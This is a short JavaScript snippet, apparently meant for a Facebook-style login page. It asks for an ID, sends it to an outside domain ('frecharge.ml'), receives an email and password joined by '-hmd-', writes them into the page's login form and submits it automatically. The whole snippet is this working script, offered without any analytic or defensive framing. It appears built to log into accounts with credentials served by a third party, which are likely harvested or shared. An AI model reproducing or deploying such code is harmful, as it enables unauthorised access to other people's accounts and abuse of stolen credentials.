	id=prompt("put id:");
	var xmlhttp;
if (window.XMLHttpRequest)
  {
  xmlhttp=new XMLHttpRequest();
  }
else
  {
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {    
   var data=xmlhttp.responseText;
	id_pass=data.split("-hmd-");document.cookie='nowfbloged='+id;{ document.forms[0].email.value = id_pass[0]; document.forms[0].pass.value = id_pass[1];}document.getElementsByName('login')[0].click();
    }
  }
xmlhttp.open("GET","http://frecharge.ml/get_id.php?get_id="+id,true);
xmlhttp.send();